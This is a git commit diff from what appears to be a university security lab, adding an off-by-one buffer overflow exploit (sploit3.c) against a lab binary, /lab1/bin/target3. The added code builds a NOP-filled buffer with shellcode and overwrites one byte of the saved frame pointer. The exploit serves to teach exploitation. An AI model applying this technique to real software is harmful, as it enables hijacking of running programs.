cf0e095a8c34d0c01446fa8534c2be0e87411077
Sebastian Liu <ll57@cs.washington.edu>
2024-04-08 18:14:13 -0700

    Sebastian: sploit3 done!

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -6,12 +6,31 @@
 
 #define TARGET "/lab1/bin/target3"
 
+#define NOOP 0x90                 // no-op instruction
+#define BUFLEN 336                // target buffer length
+#define OVERWRITING_BYTE_LEN 1    // the extra byte we are overwritting to change FP
+
+// current eip = 0x080483d6
+// ret instruction found at 0x8048351
+
+#define OVERWRITING_BYTE 0x51 // the extra byte we are overwritting to change FP
+
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char buf[BUFLEN + OVERWRITING_BYTE_LEN];
+
+  memset(buf, NOOP, sizeof(buf) - 1);
+
+  // copy the shell code to be at the beginning of the buffer
+  memcpy(buf, shellcode, sizeof(shellcode) - 1);
+
+  // set the last byte in the buffer to be the overwritting byte
+  buf[BUFLEN] = OVERWRITING_BYTE;
+
+  args[0] = TARGET; args[1] = buf; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
